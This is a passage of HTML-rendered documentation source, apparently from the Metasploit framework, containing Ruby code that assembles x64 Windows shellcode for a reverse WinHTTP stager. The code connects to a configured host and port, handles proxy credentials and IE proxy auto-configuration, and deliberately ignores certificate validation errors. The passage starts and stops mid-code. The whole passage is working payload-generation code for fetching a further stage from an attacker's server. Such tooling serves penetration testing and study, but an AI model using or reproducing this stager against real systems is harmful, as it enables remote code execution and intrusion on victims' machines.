+  <span class='id identifier rubyid_full_url'>full_url</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>://</span><span class='tstring_end'>&#39;</span></span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:host</span><span class='rbracket'>]</span>
+  <span class='id identifier rubyid_full_url'>full_url</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>:</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:port</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span> <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:ssl</span><span class='rbracket'>]</span> <span class='op'>&amp;&amp;</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:port</span><span class='rbracket'>]</span> <span class='op'>!=</span> <span class='int'>443</span>
+  <span class='id identifier rubyid_full_url'>full_url</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>:</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:port</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span> <span class='kw'>if</span> <span class='op'>!</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:ssl</span><span class='rbracket'>]</span> <span class='op'>&amp;&amp;</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:port</span><span class='rbracket'>]</span> <span class='op'>!=</span> <span class='int'>80</span>
+  <span class='id identifier rubyid_full_url'>full_url</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:uri</span><span class='rbracket'>]</span>
+
+  <span class='id identifier rubyid_encoded_full_url'>encoded_full_url</span> <span class='op'>=</span> <span class='id identifier rubyid_asm_generate_wchar_array'>asm_generate_wchar_array</span><span class='lparen'>(</span><span class='id identifier rubyid_full_url'>full_url</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_encoded_uri_index'>encoded_uri_index</span> <span class='op'>=</span> <span class='lparen'>(</span><span class='id identifier rubyid_full_url'>full_url</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span> <span class='op'>-</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:uri</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span><span class='rparen'>)</span> <span class='op'>*</span> <span class='int'>2</span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:ssl</span><span class='rbracket'>]</span> <span class='op'>&amp;&amp;</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:verify_cert_hash</span><span class='rbracket'>]</span>
+    <span class='id identifier rubyid_verify_ssl'>verify_ssl</span> <span class='op'>=</span> <span class='kw'>true</span>
+    <span class='id identifier rubyid_encoded_cert_hash'>encoded_cert_hash</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:verify_cert_hash</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_unpack'>unpack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>C*</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_map'>map</span><span class='lbrace'>{</span><span class='op'>|</span><span class='id identifier rubyid_c'>c</span><span class='op'>|</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>0x%.2x</span><span class='tstring_end'>&quot;</span></span> <span class='op'>%</span> <span class='id identifier rubyid_c'>c</span> <span class='rbrace'>}</span><span class='period'>.</span><span class='id identifier rubyid_join'><span class='object_link'><a href="../../../top-level-namespace.html#join-instance_method" title="#join (method)">join</a></span></span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>,</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_proxy_enabled'>proxy_enabled</span> <span class='op'>=</span> <span class='op'>!</span><span class='op'>!</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:proxy_host</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span><span class='period'>.</span><span class='id identifier rubyid_strip'>strip</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span> <span class='op'>&gt;</span> <span class='int'>0</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_proxy_info'>proxy_info</span>    <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_end'>&quot;</span></span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_proxy_enabled'>proxy_enabled</span>
+    <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:proxy_type</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span><span class='period'>.</span><span class='id identifier rubyid_downcase'>downcase</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>socks</span><span class='tstring_end'>&quot;</span></span>
+      <span class='id identifier rubyid_proxy_info'>proxy_info</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>socks=</span><span class='tstring_end'>&quot;</span></span>
+    <span class='kw'>else</span>
+      <span class='id identifier rubyid_proxy_info'>proxy_info</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>http://</span><span class='tstring_end'>&quot;</span></span>
+    <span class='kw'>end</span>
+
+    <span class='id identifier rubyid_proxy_info'>proxy_info</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:proxy_host</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span>
+    <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:proxy_port</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_to_i'>to_i</span> <span class='op'>&gt;</span> <span class='int'>0</span>
+      <span class='id identifier rubyid_proxy_info'>proxy_info</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>:</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:proxy_port</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
+    <span class='kw'>end</span>
+
+    <span class='id identifier rubyid_proxy_info'>proxy_info</span> <span class='op'>=</span> <span class='id identifier rubyid_asm_generate_wchar_array'>asm_generate_wchar_array</span><span class='lparen'>(</span><span class='id identifier rubyid_proxy_info'>proxy_info</span><span class='rparen'>)</span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_proxy_user'>proxy_user</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:proxy_user</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span> <span class='op'>==</span> <span class='int'>0</span> <span class='op'>?</span> <span class='kw'>nil</span> <span class='op'>:</span> <span class='id identifier rubyid_asm_generate_wchar_array'>asm_generate_wchar_array</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:proxy_user</span><span class='rbracket'>]</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_proxy_pass'>proxy_pass</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:proxy_pass</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span> <span class='op'>==</span> <span class='int'>0</span> <span class='op'>?</span> <span class='kw'>nil</span> <span class='op'>:</span> <span class='id identifier rubyid_asm_generate_wchar_array'>asm_generate_wchar_array</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:proxy_pass</span><span class='rbracket'>]</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_custom_headers'>custom_headers</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:custom_headers</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span> <span class='op'>==</span> <span class='int'>0</span> <span class='op'>?</span> <span class='kw'>nil</span> <span class='op'>:</span> <span class='id identifier rubyid_asm_generate_wchar_array'>asm_generate_wchar_array</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:custom_headers</span><span class='rbracket'>]</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_http_open_flags'>http_open_flags</span> <span class='op'>=</span> <span class='int'>0x00000100</span> <span class='comment'># WINHTTP_FLAG_BYPASS_PROXY_CACHE
+</span>  <span class='id identifier rubyid_secure_flags'>secure_flags</span> <span class='op'>=</span> <span class='lparen'>(</span>
+    <span class='int'>0x00002000</span> <span class='op'>|</span> <span class='comment'># SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
+</span>    <span class='int'>0x00001000</span> <span class='op'>|</span> <span class='comment'># SECURITY_FLAG_IGNORE_CERT_CN_INVALID
+</span>    <span class='int'>0x00000200</span> <span class='op'>|</span> <span class='comment'># SECURITY_FLAG_IGNORE_WRONG_USAGE
+</span>    <span class='int'>0x00000100</span> <span class='rparen'>)</span> <span class='comment'># SECURITY_FLAG_IGNORE_UNKNOWN_CA
+</span>
+  <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:ssl</span><span class='rbracket'>]</span>
+    <span class='id identifier rubyid_http_open_flags'>http_open_flags</span> <span class='op'>|=</span> <span class='int'>0x00800000</span> <span class='comment'># WINHTTP_FLAG_SECURE
+</span>  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_ie_proxy_autodect'>ie_proxy_autodect</span> <span class='op'>=</span> <span class='lparen'>(</span>
+    <span class='int'>0x00000001</span> <span class='op'>|</span> <span class='comment'># WINHTTP_AUTO_DETECT_TYPE_DHCP
+</span>    <span class='int'>0x00000002</span> <span class='rparen'>)</span> <span class='comment'># WINHTTP_AUTO_DETECT_TYPE_DNS_A
+</span>
+  <span class='id identifier rubyid_ie_proxy_flags'>ie_proxy_flags</span> <span class='op'>=</span> <span class='lparen'>(</span>
+    <span class='int'>0x00000001</span> <span class='op'>|</span> <span class='comment'># WINHTTP_AUTOPROXY_AUTO_DETECT
+</span>    <span class='int'>0x00000002</span> <span class='rparen'>)</span> <span class='comment'># WINHTTP_AUTOPROXY_CONFIG_URL
+</span>
+  <span class='id identifier rubyid_asm'>asm</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+      xor rbx, rbx
+    load_winhttp:
+      push rbx                      ; stack alignment
+      mov r14, &#39;winhttp&#39;
+      push r14                      ; Push &#39;winhttp&#39;,0 onto the stack
+      mov rcx, rsp                  ; lpFileName (stackpointer)
+      mov r10, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>LoadLibraryA</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'> ; LoadLibraryA
+      call rbp
+  </span><span class='tstring_end'>^</span></span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_verify_ssl'>verify_ssl</span>
+    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    load_crypt32:
+      push rbx                      ; stack alignment
+      mov r14, &#39;crypt32&#39;
+      push r14                      ; Push &#39;crypt32&#39;,0 onto the stack
+      mov rcx, rsp                  ; lpFileName (stackpointer)
+      mov r10, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>LoadLibraryA</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'> ; LoadLibraryA
+      call rbp
+    </span><span class='tstring_end'>^</span></span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    winhttpopen:
+      push rbx                      ; stack alignment
+      push rbx                      ; NULL pointer
+      mov rcx, rsp                  ; pwszAgent (&quot;&quot;)
+  </span><span class='tstring_end'>^</span></span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_proxy_enabled'>proxy_enabled</span>
+    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+      push 3
+      pop rdx                       ; dwAccessType (3=WINHTTP_ACCESS_TYPE_NAMED_PROXY)
+      call load_proxy_name
+      db </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_proxy_info'>proxy_info</span><span class='embexpr_end'>}</span><span class='tstring_content'>              ; proxy information
+    load_proxy_name:
+      pop r8                        ; pwszProxyName (stack pointer)
+    </span><span class='tstring_end'>^</span></span>
+  <span class='kw'>else</span>
+    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+      push rbx
+      pop rdx                       ; dwAccessType (0=WINHTTP_ACCESS_TYPE_DEFAULT_PROXY)
+      xor r8, r8                    ; pwszProxyName (NULL)
+    </span><span class='tstring_end'>^</span></span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+      xor r9, r9                    ; pwszProxyBypass (NULL)
+      push rbx                      ; stack alignment
+      push rbx                      ; dwFlags (0)
+      mov r10, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>winhttp.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>WinHttpOpen</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>; WinHttpOpen
+      call rbp
+  </span><span class='tstring_end'>^</span></span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:proxy_ie</span><span class='rbracket'>]</span> <span class='op'>==</span> <span class='kw'>true</span> <span class='op'>&amp;&amp;</span> <span class='op'>!</span><span class='id identifier rubyid_proxy_enabled'>proxy_enabled</span>
+    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+      mov r12, rax                  ; Session handle is required later for ie proxy
+    </span><span class='tstring_end'>^</span></span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+      call load_server_host
+      db </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_encoded_host'>encoded_host</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+    load_server_host:
+      pop rdx                       ; pwszServerName
+      mov rcx, rax                  ; hSession
+      mov r8, </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:port</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>        ; nServerPort
+      xor r9, r9                    ; dwReserved
+      mov r10, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>winhttp.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>WinHttpConnect</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'> ; WinHttpConnect
+      call rbp
+
+      call winhttpopenrequest
+  </span><span class='tstring_end'>^</span></span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:proxy_ie</span><span class='rbracket'>]</span> <span class='op'>==</span> <span class='kw'>true</span> <span class='op'>&amp;&amp;</span> <span class='op'>!</span><span class='id identifier rubyid_proxy_enabled'>proxy_enabled</span>
+    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+      db </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_encoded_full_url'>encoded_full_url</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+    </span><span class='tstring_end'>^</span></span>
+  <span class='kw'>else</span>
+    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+      db </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_encoded_uri'>encoded_uri</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+    </span><span class='tstring_end'>^</span></span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    winhttpopenrequest:
+      mov rcx, rax                  ; hConnect
+      push rbx
+      pop rdx                       ; pwszVerb (NULL=GET)
+      pop r8                        ; pwszObjectName (URI)
+  </span><span class='tstring_end'>^</span></span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:proxy_ie</span><span class='rbracket'>]</span> <span class='op'>==</span> <span class='kw'>true</span> <span class='op'>&amp;&amp;</span> <span class='op'>!</span><span class='id identifier rubyid_proxy_enabled'>proxy_enabled</span>
+    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+      mov r13, r8                   ; store a copy of the URL for later
+      add r8, </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_encoded_uri_index'>encoded_uri_index</span><span class='embexpr_end'>}</span><span class='tstring_content'>  ; move r8 up to where the URI stars
+    </span><span class='tstring_end'>^</span></span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+      xor r9, r9                    ; pwszVersion (NULL)
+      push rbx                      ; stack alignment
+      mov rax, </span><span class='embexpr_beg'>#{</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>0x%.8x</span><span class='tstring_end'>&quot;</span></span> <span class='op'>%</span> <span class='id identifier rubyid_http_open_flags'>http_open_flags</span><span class='embexpr_end'>}</span><span class='tstring_content'>  ; dwFlags
+      push rax
+      push rbx                      ; lppwszAcceptType (NULL)
+      push rbx                      ; pwszReferer (NULL)
+      mov r10, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>winhttp.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>WinHttpOpenRequest</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'> ; WinHttpOpenRequest
+      call rbp
+
+    prepare:
+      mov rsi, rax                  ; Store hConnection in rsi
+  </span><span class='tstring_end'>^</span></span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_proxy_enabled'>proxy_enabled</span> <span class='op'>&amp;&amp;</span> <span class='id identifier rubyid_proxy_user'>proxy_user</span>
+    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+      call load_proxy_user          ; puts proxy_user pointer on stack
+      db </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_proxy_user'>proxy_user</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+    load_proxy_user:
+      pop r8                        ; lpBuffer (stack pointer)
+      mov rcx, rsi                  ; hConnection (connection handle)
+      mov rdx, 0x1002               ; (0x1002=WINHTTP_OPTION_PROXY_USERNAME)
+      push </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_proxy_user'>proxy_user</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span><span class='embexpr_end'>}</span><span class='tstring_content'>     ; dwBufferLength (proxy_user length)
+      pop r9
+      mov r10, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>winhttp.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>WinHttpSetOption</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'> ; WinHttpSetOption
+      call rbp
+    </span><span class='tstring_end'>^</span></span>
+  <span class='kw'>end</span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_proxy_enabled'>proxy_enabled</span> <span class='op'>&amp;&amp;</span> <span class='id identifier rubyid_proxy_pass'>proxy_pass</span>
+    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+      call load_proxy_pass          ; puts proxy_pass pointer on stack
+      db </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_proxy_pass'>proxy_pass</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+    load_proxy_pass:
+      pop r8                        ; lpBuffer (stack pointer)
+      mov rcx, rsi                  ; hConnection (connection handle)
+      mov rdx, 0x1003               ; (0x1003=WINHTTP_OPTION_PROXY_PASSWORD)
+      push </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_proxy_pass'>proxy_pass</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span><span class='embexpr_end'>}</span><span class='tstring_content'>     ; dwBufferLength (proxy_pass length)
+      pop r9
+      mov r10, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>winhttp.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>WinHttpSetOption</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'> ; WinHttpSetOption
+      call rbp
+    </span><span class='tstring_end'>^</span></span>
+  <span class='kw'>end</span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:proxy_ie</span><span class='rbracket'>]</span> <span class='op'>==</span> <span class='kw'>true</span> <span class='op'>&amp;&amp;</span> <span class='op'>!</span><span class='id identifier rubyid_proxy_enabled'>proxy_enabled</span>
+    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+      ; allocate space for WINHTTP_CURRENT_USER_IE_PROXY_CONFIG, which is
+      ; a 32-byte structure
+      sub rax, 32
+      mov rdi, rsp                  ; save a pointer to this buffer
+      mov rcx, rdi                  ; this buffer is also the parameter to the function
+      mov r10, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>winhttp.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>WinHttpGetIEProxyConfigForCurrentUser</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'> ; WinHttpGetIEProxyConfigForCurrentUser
+      call rbp
+
+      test eax, eax                 ; skip the rest of the proxy stuff if the call failed
+      jz ie_proxy_setup_finish
+
+      ; we don&#39;t care about the &quot;auto detect&quot; flag, as it doesn&#39;t seem to
+      ; impact us at all.
+
+      ; check if there&#39;s an auto configuration URL
+      mov rax, [rdi+8]
+      test eax, eax
+      jz ie_proxy_manual
+
+      ; set up the autoproxy structure on the stack and get it ready to pass
+      ; into the target function
+      mov rcx, rbx
+      inc rcx
+      shl rcx, 32
+      push rcx                      ; dwReserved (0) and fAutoLoginIfChallenged
+      push rbx                      ; lpvReserved (NULL)
+      push rax                      ; lpszAutoConfigUrl
+      mov rax, </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_ie_proxy_flags'>ie_proxy_flags</span> <span class='op'>|</span> <span class='id identifier rubyid_ie_proxy_autodect'>ie_proxy_autodect</span> <span class='op'>&lt;&lt;</span> <span class='int'>32</span><span class='embexpr_end'>}</span><span class='tstring_content'> ; dwAutoDetectFlags and dwFlags
+      push rax
+      mov r8, rsp                   ; put the structure in the parameter list
+
+      ; prepare the proxy info buffer, 32 bytes required
+      sub rsp, 32
+      mov rdi, rsp                  ; we&#39;ll need a pointer to this later
+      mov r9, rdi                   ; pass it as the 4th parameter
+
+      ; rest of the parameters
+      mov rcx, r12                  ; hSession
+      mov rdx, r13                  ; lpcwszUrl
+
+      ; finally make the call
+      mov r10, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>winhttp.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>WinHttpGetProxyForUrl</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'> ; WinHttpGetProxyForUrl
+      call rbp
+
+      test eax, eax                 ; skip the rest of the proxy stuff if the call failed
+      jz ie_proxy_setup_finish
+      jmp set_ie_proxy              ; rdi points to the filled out proxy structure
+
+    ie_proxy_manual:
+      mov rax, [rdi+16]             ; check for the manual proxy
+      test eax, eax
+      jz ie_proxy_setup_finish
+
+      add rdi, 8
+      push 3
+      pop rax
